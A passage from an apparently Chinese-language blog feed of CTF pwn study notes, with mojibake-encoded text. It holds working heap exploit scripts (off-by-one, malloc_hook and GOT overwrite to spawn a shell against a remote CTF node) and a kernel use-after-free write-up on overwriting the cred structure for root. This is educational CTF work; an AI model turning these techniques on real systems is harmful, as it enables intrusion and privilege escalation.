class="number">0x80</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">leak_libc_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc_addr&#x27;</span>)</span><br><span class="line">libc_base_addr=leak_libc_addr-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">malloc_hook=libc_base_addr+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="comment">#realloc_addr=libc_base_addr+libc.symbols[&#x27;realloc&#x27;]</span></span><br><span class="line">realloc_addr=libc_base_addr+<span class="number">0x846c0</span></span><br><span class="line">write(<span class="number">2</span>,<span class="number">0x8</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"><span class="comment">#one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]</span></span><br><span class="line">one_gadget=[<span class="number">0x45226</span>,<span class="number">0x4526a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget=libc_base_addr+one_gadget[<span class="number">1</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">payload=<span class="number">0xb</span>*<span class="string">b&#x27;a&#x27;</span>+p64(one_gadget)+p64(realloc_addr+<span class="number">16</span>)<span class="comment">#p64(one_gadget)</span></span><br><span class="line">write(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0xccc)</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221007205137521.png" alt="image-20221007205137521"></p><blockquote><p> è¿™é“é¢˜è€ƒå¯Ÿçš„off by oneï¼Œä½†æ˜¯è·Ÿä»¥å¾€ç”¨off by oneæ¥è®©å †å—åˆå¹¶åˆ¶é€ å †å—é‡å çš„æ–¹å¼ä¸åŒã€‚è¿™é“é¢˜ç”±äºé™åˆ¶äº†ç”³è¯·å †å—çš„å¤§å°ï¼Œè®©chunké‡Šæ”¾ä¹‹åæ— æ³•è¿›å…¥unsorted bin (è¿™å°±æ„å‘³ç€å †å—æ— æ³•è§¦å‘åˆå¹¶)ã€‚æ‰€ä»¥é‡‡ç”¨ä¼ªé€ sizeï¼Œç„¶åç›´æ¥é‡Šæ”¾å°†å…¶é€ æˆå †å—é‡å ã€‚</p></blockquote><h2 id="npuctf-2020-easyheap"><a href="#npuctf-2020-easyheap" class="headerlink" title="npuctf_2020_easyheap"></a>npuctf_2020_easyheap</h2><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š-3"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-3" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="/../img/image-20221007205201197.png" alt="image-20221007205201197"></p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p><img src="/../img/image-20221007205223694.png" alt="image-20221007205223694"></p><p>åœ¨editå‡½æ•°ä¸­ï¼Œ<u>è¾“å…¥çš„æ•°æ®æ¯”ç”³è¯·çš„chunkèŒƒå›´å¤§äº†ä¸€ä¸ªå­—èŠ‚ã€‚ç„¶ååˆ›å»ºå †å—çš„æ—¶å€™å‘ç°åªèƒ½åˆ›å»º0x18æˆ–è€…0x38çš„å †å—ï¼Œè¿™æ­£å¥½æ˜¯off by oneåˆ©ç”¨çš„å‰æ</u>ï¼ˆå¦‚ä¸‹å›¾ï¼‰ã€‚</p><p><img src="/../img/image-20221007205233601.png" alt="image-20221007205233601"></p><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>ç”±äºç”³è¯·çš„å †å—éƒ½å±äºtcachebinçš„èŒƒå›´ï¼Œé‡Šæ”¾æ‰ä¹‹åä¹Ÿæ— æ³•è¿›è¡Œåˆå¹¶ã€‚æ‰€ä»¥æˆ‘ä»¬ä¸å¾€åˆ¶é€ å †å—åˆå¹¶é‚£ä¸ªæ–¹å‘è€ƒè™‘ã€‚<strong>è¿™é“é¢˜çš„ç‰¹æ®Šæ€§æ˜¯å­˜åœ¨æŒ‡é’ˆå †å—ï¼ˆå°±æ˜¯ç¨‹åºè‡ªå·±ç”³è¯·äº†ä¸€ä¸ªå †å—ï¼Œé‡Œé¢å­˜æ”¾äº†æˆ‘ä»¬ç”³è¯·å †å—çš„æŒ‡é’ˆï¼‰</strong>ï¼Œåƒè¿™ç§é¢˜ç›®æˆ‘ä»¬é€šå¸¸é‡‡ç”¨ç¯¡æ”¹æŒ‡é’ˆå †å—é‡Œå­˜æ”¾çš„æŒ‡é’ˆï¼Œè€Œä¸”é€šå¸¸æ˜¯ç”¨äº’æ¢æŒ‡é’ˆå †å—å’Œç”¨æˆ·å †å—çš„æ–¹æ³•ã€‚</p><p>ä»¥è¿™é“é¢˜ä¸ºä¾‹ï¼Œæˆ‘ä»¬ç”³è¯·ä¸¤ä¸ªå †å—</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add(0x18,&#x27;aaaa&#x27;)</span><br><span class="line">add(0x18,&#x27;bbbb&#x27;)</span><br></pre></td></tr></table></figure><p>å°†ç¬¬ä¸€ä¸ªå †å—å½“åšæº¢å‡ºå †å—ï¼Œç„¶åå»æ”¹å˜ç¬¬äºŒä¸ªæŒ‡é’ˆå †å—çš„sizeï¼Œå°†å…¶sizeä½æ”¹ä¸º0x41ã€‚</p><blockquote><p>ä¸ºä»€ä¹ˆè¦æ”¹æˆ0x41?</p><p>å› ä¸ºæˆ‘ä»¬åªèƒ½ç”³è¯·0x18å’Œ0x38ä¸¤ç§å¤§å°çš„å †å—ï¼Œå¦‚æœç”³è¯·0x18é‚£ä¹ˆå¾—åˆ°çš„å°±æ˜¯0x20å¤§å°çš„å †å—ï¼Œå’ŒæŒ‡é’ˆå †å—ä¸€æ ·å¤§ï¼Œé‚£è¿˜æ€ä¹ˆå †å—é‡å å‘¢ï¼Ÿæ‰€ä»¥æˆ‘ä»¬åªèƒ½ç”³è¯·0x38å¤§å°çš„å †å—ï¼Œå¾—åˆ°çš„æ˜¯0x40å¤§å°çš„å †å—ï¼Œæˆ‘ä»¬å°†ç¬¬äºŒä¸ªæŒ‡é’ˆå †å—çš„sizeä½æ”¹ä¸º0x41ä¹‹åï¼Œå†ç”³è¯·ä¸€ä¸ª0x38å¤§å°çš„å †å—ï¼Œå°±ä¼šæŠŠåŸæœ¬æŒ‡é’ˆå †å—çš„ä½ç½®ç”³è¯·å›æ¥(å› ä¸ºå®ƒçš„å¤§å°è¢«ä¼ªé€ æˆäº†0x41)å½“åšç”¨æˆ·å †å—ï¼Œé‚£ä¹ˆæ­¤æ—¶çœŸæ­£çš„æŒ‡é’ˆå †å—å°±å’Œç”¨æˆ·å †å—é€ æˆäº†é‡å (å¦‚ä¸‹å›¾)</p><p>PS:ç”¨æˆ·å †å—æˆ‘æŒ‡çš„æ˜¯è‡ªå·±ç”³è¯·çš„å †å—ï¼ŒæŒ‡é’ˆå †å—æ˜¯ç¨‹åºè‡ªå·±ç”³è¯·çš„é‚£ä¸ªå †å—</p></blockquote><p><img src="/../img/image-20221007205244060.png" alt="image-20221007205244060"></p><p>ç„¶åç”³è¯·ä¸€ä¸ª0x38å¤§å°çš„å †å—ï¼Œå°±é€ æˆäº†å †å—é‡å ã€‚ç„¶åæ€è·¯å°±æ˜¯å¾€ç”¨æˆ·å †å—å†™å…¥æ•°æ®ï¼Œè¦†å†™æŒ‡é’ˆå †å—é‡Œçš„æŒ‡é’ˆå°†å…¶æ”¹å®Œfreeå‡½æ•°çš„gotè¡¨ï¼Œç„¶åè¿›è¡Œæ³„éœ²å¾—åˆ°libcåœ°å€ã€‚ç„¶åå†ç”¨editå‡½æ•°è¦†å†™editå‡½æ•°çš„gotè¡¨ä¸ºsystemçš„åœ°å€ï¼Œæœ€åé‡Šæ”¾æ‰ä¸€ä¸ªå­˜æœ‰&#x2F;bin&#x2F;shå­—ç¬¦ä¸²çš„å †å—å³å¯è·å–shellã€ã€‚</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27557</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size of Heap(0x10 or 0x20 only) : &#x27;</span>,<span class="built_in">str</span>(size)) </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Done!\n&#x27;</span>)</span><br><span class="line">     </span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Done!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0x0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#debug(p,0x400E9f)</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;ffff&#x27;</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x38</span>)+p64(free_got_addr)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content : &#x27;</span>)</span><br><span class="line">free_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;free_addr&#x27;</span>)</span><br><span class="line">sys_addr,bin_sh_addr=long_search(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line"><span class="comment">#sys_addr,bin_sh_addr=local_search(&#x27;free&#x27;,free_addr,libc)</span></span><br><span class="line">payload=p64(sys_addr)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment">#debug(p,0x400D81)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221007205307506.png" alt="image-20221007205307506"></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> off_by_null </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äº kernel-UAF çš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/406ce0e2.html"/>
      <url>/posts/406ce0e2.html</url>
      
        <content type="html"><![CDATA[<p>ç»ˆäºæ¥åˆ°äº†å…³äºå†…æ ¸çš„å­¦ä¹ ï¼Œç›®å‰æ‰“ç®—æµ…å°ä¸€ä¸‹å†…æ ¸çš„åŸºç¡€çŸ¥è¯†å’Œæ¼æ´ã€‚ä¹‹åæ¯ä¸ªå­¦ä¹ çš„æ–°æ¼æ´éƒ½å•ç‹¬å†™ä¸€ç¯‡æ–‡ç« ï¼Œæ¯ç¯‡å­¦åˆ°çš„æ–°çš„å‰ç½®çŸ¥è¯†éƒ½æ”¾åˆ°å¯¹åº”çš„æ–‡ç« ä¸­å§ï¼Œæš‚æ—¶å…ˆä¸åšæ±‡æ€»ã€‚</p><h3 id="CISCN2017-Pwn-babydriver"><a href="#CISCN2017-Pwn-babydriver" class="headerlink" title="CISCN2017_Pwn_babydriver"></a>CISCN2017_Pwn_babydriver</h3><h4 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h4><p>å°† <code>rootfs.cpio</code> æ–‡ä»¶ç³»ç»Ÿæ˜ åƒè§£åŒ…ï¼Œå› ä¸ºé™æ€åˆ†æéœ€è¦è§£åŒ…å¾—åˆ°çš„ <code>ko</code> æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hen rootfs.cpio</span><br></pre></td></tr></table></figure><p>è§£åŒ…è„šæœ¬ <code>hen</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$1</span> <span class="variable">$1</span>.gz</span><br><span class="line">unar <span class="variable">$1</span>.gz</span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$1</span> core</span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$1</span>.gz <span class="variable">$1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+]Successful&quot;</span></span><br></pre></td></tr></table></figure><p>æ‰“åŒ…è„šæœ¬ <code>gen</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; <span class="variable">$1</span> </span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$1</span> ..</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼Œä» <code>bzImage</code> æ–‡ä»¶ä¸­æå– <code>vmlinux</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure><h5 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gdb vmlinux</span><br></pre></td></tr></table></figure><p>ä¸‹é¢çš„å‘½ä»¤å¯¼å…¥ç¬¦å·è¡¨ï¼Œè¿™ä¸ª <code>ko</code> æ–‡ä»¶æ˜¯åˆšåˆšè§£å‹ <code>rootfs.cpio</code> å¾—åˆ°çš„ï¼Œåé¢è¿™ä¸ª <code>0xffffffffc0000000</code> éœ€è¦åœ¨å¯åŠ¨å†…æ ¸åï¼Œè¾“å…¥ <code>lsmod</code> æŸ¥çœ‹é©±åŠ¨çš„åŸºåœ°å€ä»è€Œå¾—åˆ°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add-symbol-file /home/zikh/Desktop/babydriver/core/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000</span><br></pre></td></tr></table></figure><p>æœ€åç”¨ä¸‹é¢çš„å‘½ä»¤è¿æ¥ï¼Œè°ƒè¯•ç¨‹åº</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303261609913.png" alt="image-20230326160909064"></p><p>è®¾ç½®æ–­ç‚¹éœ€è¦ç”¨é©±åŠ¨çš„åŸºåœ°å€åŠ ä¸Š <code>ida</code> ä¸­çš„åç§»çš„ä½ç½®æ‰“æ–­ç‚¹å³å¯ï¼Œè¿™ä¸ªåŸºåœ°å€ä»…ä»…æ˜¯å’Œ <code>text</code> æ®µçš„åœ°å€ç›¸åŒï¼Œå‡è®¾ä½ ç°åœ¨æƒ³æŸ¥çœ‹ <code>bss</code> æ®µä¸Šçš„æŸä¸ªå˜é‡ï¼Œé‚£ä¹ˆéœ€è¦è·å–åˆ° <code>bss</code> æ®µçš„åŸºåœ°å€ä»¥åŠå˜é‡åœ¨ <code>bss</code> æ®µä¸Šçš„åç§»ã€‚</p><p>å‡è®¾è¦æŸ¥çœ‹ <code>0xd90</code> è¿™ä¸ªåœ°å€è£…è½½åˆ°å†…å­˜ä¸­çš„å®é™…åœ°å€ã€‚é¦–å…ˆè·å–å®ƒåœ¨ <code>bss</code> æ®µä¸Šçš„åç§»ï¼Œå‘ç° <code>bss</code> æ®µåŸºåœ°å€ä¸º <code>0xd00</code> å› æ­¤è¿™ä¸ªåœ°å€åœ¨ <code>bss</code> æ®µä¸Šåç§»ä¸º <code>0x90</code> </p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303270841264.png" alt="image-20230327084110128" style="zoom: 50%;" /><p>è·å– <code>bss</code> æ®µçš„åŸºåœ°å€ ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303270843604.png" alt="image-20230327084300554"></p><p>å› æ­¤ <code>babydevice_t</code> ç»“æ„ä½“åœ°å€æ˜¯ <code>0xffffffffc00024d0</code> ï¼ŒéªŒè¯å¦‚ä¸‹</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303270853716.png" alt="image-20230327085333674"></p><h5 id="å†…æ ¸ææƒ"><a href="#å†…æ ¸ææƒ" class="headerlink" title="å†…æ ¸ææƒ"></a>å†…æ ¸ææƒ</h5><p>å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿä¿®æ”¹æŸä¸ªè¿›ç¨‹ä¸­çš„ <code>cred</code> ç»“æ„ä½“ä¸­çš„ <code>gid</code> å’Œ <code>uid</code> <code>euid</code>ç­‰å­—æ®µä¸º <code>0</code>ï¼Œä¹Ÿå°±æ˜¯èƒ½æ§åˆ¶ <code>cred</code> ç»“æ„ä½“çš„è¯ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±è·å¾—äº† <code>root</code> æƒé™ï¼Œå¦‚æœå†å¼€å¯ä¸€ä¸ª <code>shell</code> çš„è¯ï¼Œæ‰§è¡Œçš„ä»»ä½•å‘½ä»¤ä¹Ÿéƒ½æ˜¯æ‹¥æœ‰ <code>root</code> æƒé™</p><h5 id="é¢˜ç›®é“¾æ¥"><a href="#é¢˜ç›®é“¾æ¥" class="headerlink" title="é¢˜ç›®é“¾æ¥"></a>é¢˜ç›®é“¾æ¥</h5><p><a href="https://github.com/cc-sir/ctf-challenge/blob/master/2017CISCN%20babydriver/babydriver.tar">https://github.com/cc-sir/ctf-challenge/blob/master/2017CISCN%20babydriver/babydriver.tar</a></p><p>è§£å‹æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xvf babydriver.tar</span><br></pre></td></tr></table></figure><p><code>boot.sh</code> æ–‡ä»¶</p><p>å› ä¸ºæˆ‘çš„è™šæ‹Ÿæœºä¸æ”¯æŒ <code>kvm</code> ï¼Œæ‰€ä»¥æŠŠåŸæœ¬ <code>-enable-kvm</code> è¿™æ®µä»£ç åˆ äº†ï¼Œä¸ºäº†æ–¹ä¾¿ä¹‹åä½¿ç”¨ <code>gdb</code> è¿›è¡Œè°ƒè¯•ï¼ŒåŠ ä¸Šäº† <code>-gdb tcp::1234</code> è¿™æ®µä»£ç </p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span>  -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -gdb tcp::1234</span><br></pre></td></tr></table></figure><p>ç„¶åè¿è¡Œ <code>boot.sh</code> å¯åŠ¨å³å¯ã€‚</p><h5 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h5><h6 id="babyopen"><a href="#babyopen" class="headerlink" title="babyopen"></a>babyopen</h6><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303261513281.png" alt="image-20230326151320208"></p><p>ç”³è¯·äº† <code>0x40</code> çš„å †ç©ºé—´ï¼Œå¹¶è¿”å›ç”³è¯·çš„å†…å­˜é¦–åœ°å€è®°å½•åœ¨ <code>babydevice_t</code> ç»“æ„ä½“çš„ <code>device_buf</code> å­—æ®µ</p><p>å°† <code>0x40</code> èµ‹å€¼ä¸º <code>babydevice_t</code> ç»“æ„ä½“çš„ <code>device_buf</code> å­—æ®µã€‚éœ€è¦æ³¨æ„çš„æ˜¯ <code>babydevice_t</code> ç»“æ„ä½“ä½äº <code>bss</code> æ®µä¸Šï¼Œè¿™ä¸ªå…¨å±€å˜é‡å°±ä¼šå­˜åœ¨è¢«è¦†ç›–çš„å¯èƒ½ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘è¿ç»­ <code>open</code> ä¸¤æ¬¡ï¼Œé‚£ä¹ˆç¬¬äºŒæ¬¡ç”³è¯·å‡ºæ¥çš„å†…å­˜å—åœ°å€åˆ™ä¼šè¦†ç›–ç¬¬ä¸€æ¬¡ç”³è¯·çš„å†…å­˜å—åœ°å€ã€‚</p><h6 id="babyioctl"><a href="#babyioctl" class="headerlink" title="babyioctl"></a>babyioctl</h6><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262003083.png" alt="image-20230326200309961" style="zoom: 80%;" /><p>è¯¥å‡½æ•°å®šä¹‰äº†ä¸€ä¸ª <code>0x10001</code> çš„å‘½ä»¤ï¼Œå…ˆå°† <code>babydevice_t</code> ç»“æ„ä½“ä¸­çš„ <code>device_buf</code> ç»™é‡Šæ”¾æ‰ï¼Œç„¶åé‡æ–°ç”³è¯·äº†ä¸€å—å†…å­˜ï¼Œå› ä¸º <code>v3</code> æ˜¯ <code>rdx</code> å¯„å­˜å™¨æ‰€èµ‹å€¼çš„ï¼Œä¹Ÿå°±æ˜¯ <code>babyioctl</code> å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œè€Œ <code>v3</code> åˆç»™äº† <code>v4</code> ï¼Œè¿™ä¸ªå†…å­˜å¤§å°æ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚</p><h6 id="babyread"><a href="#babyread" class="headerlink" title="babyread"></a>babyread</h6><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262016891.png" alt="image-20230326201609836"></p><p>è¯¥å‡½æ•°æ˜¾ç¤ºæ£€æŸ¥äº† <code>device_buf</code> æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºçš„è¯è¿”å› <code>-1</code> ï¼Œå¦‚æœ <code>device_buf_len</code> å¤§äº <code>write</code> å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°åˆ™å°† <code>device_buf</code> ä¸­çš„æ•°æ® <code>copy</code> åˆ°ç”¨æˆ·åŒº <code>buffer</code> ç©ºé—´ä¸­</p><p>è¿™é‡Œ <code>ida</code> ç”Ÿæˆçš„ä¼ªä»£ç æ˜¯æœ‰ç‚¹é—®é¢˜çš„ï¼Œæ­£å¸¸æƒ…å†µæ˜¯ <code>copy_to_user(buffer, babydev_struct.device_buf, v4);</code></p><h6 id="babywrite"><a href="#babywrite" class="headerlink" title="babywrite"></a>babywrite</h6><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262041836.png" alt="image-20230326204108774"></p><p>è¿™ä¸ªå‡½æ•°å’Œ <code>babywrite</code> æ˜¯ç›¸åçš„ï¼Œå°†æ•°æ®ä»ç”¨æˆ·åŒºçš„ <code>buffer</code> å¤åˆ¶åˆ°å†…æ ¸ä¸­çš„ <code>device_buf</code> ã€‚</p><h6 id="babyrelease"><a href="#babyrelease" class="headerlink" title="babyrelease"></a>babyrelease</h6><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262101441.png" alt="image-20230326210113392" style="zoom: 80%;" /><p>è¯¥å‡½æ•°å¯ä»¥å°† <code>device_buf</code> è¿™ä¸ªå †å—ç»™é‡Šæ”¾æ‰ï¼Œä½†æ˜¯é‡Šæ”¾å†…å­˜åï¼Œæœªå°†æŒ‡é’ˆç½®ç©ºï¼Œäº§ç”Ÿäº† <code>UAF</code> æ¼æ´ã€‚</p><h4 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h4><p>è¿ç»­ <code>open</code> ä¸¤æ¬¡ï¼Œåˆ†é…å‡º <code>fd1</code> å’Œ <code>fd2</code> ï¼Œæ­¤æ—¶ <code>fd2</code> å°† <code>fd1</code> çš„å †å—åœ°å€è¦†ç›–æ‰äº†ã€‚å†ä½¿ç”¨ <code>ioctl</code> å‡½æ•°å»æ‰§è¡Œé‚£ä¸ª <code>0x10001</code> çš„æŒ‡ä»¤ï¼Œå°† <code>fd1</code> é‡Šæ”¾æ‰ ï¼ˆå…¶å®é‡Šæ”¾çš„æ˜¯ <code>fd2</code> ï¼‰ï¼Œå†ç”³è¯·ä¸€ä¸ª <code>0xa8</code> çš„å †å—å‡ºæ¥ï¼ˆç”¨äºä¼ªé€  <code>cred</code> ç»“æ„ä½“ ï¼‰ï¼Œæ¥ç€å†ç”¨ <code>release</code> ï¼ˆä¹Ÿå°±æ˜¯ <code>close</code> ï¼‰ å‡½æ•°å°† <code>fd1</code> é‡Šæ”¾æ‰ï¼ˆæ­¤æ—¶é‡Šæ”¾çš„æ˜¯åˆšåˆšç”³è¯·å‡ºæ¥ <code>0xa8 </code>çš„é‚£ä¸ªå †å—ï¼‰</p><p>è°ƒç”¨ <code>fork</code> å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹å‡ºæ¥ï¼Œå¹¶è®©çˆ¶è¿›ç¨‹ <code>wait</code>ã€‚å­è¿›ç¨‹äº§ç”Ÿæ—¶ï¼Œå°±éœ€è¦ç”³è¯·ä¸€ä¸ª <code>0xa8</code> çš„å †å—ç”¨æ¥å½“åš <code>cred</code> ç»“æ„ä½“ï¼Œè¿™æ—¶å°±ä¼šç”³è¯·å‡ºæ¥åˆšåˆšçš„æˆ‘ä»¬é‡Šæ”¾æ‰çš„å †å—ã€‚å› ä¸ºæœ€å <code>release</code> æ˜¯å¯¹ <code>fd1</code> æ“ä½œçš„ï¼Œæ­¤æ—¶ <code>fd2</code> æ˜¯ä¾ç„¶å¯ä»¥è¢«å†™å…¥æ•°æ®çš„ï¼Œå‘ <code>fd2</code> ä¸­å†™å…¥æ•°æ®å°±ç­‰åŒäºå‘å­è¿›ç¨‹åˆšåˆšç”³è¯· <code>cred</code> ç»“æ„ä½“ä¸­å†™å…¥æ•°æ®ã€‚æ­¤æ—¶çˆ¶è¿›ç¨‹ä¸­ <code>device_buf</code> è®°å½•çš„å°±æ˜¯åˆšåˆšå­è¿›ç¨‹ç”³è¯·å †å—çš„åœ°å€ã€‚</p><p>å°†å…¶ <code>cred</code> ç»“æ„ä½“å‰ <code>0x28</code> ä¸ªå­—èŠ‚è¦†ç›–æˆ <code>\x00</code> æ‰§è¡Œ <code>system(&quot;/bin/sh&quot;)</code> å³å¯å¼€å¯ä¸€ä¸ª 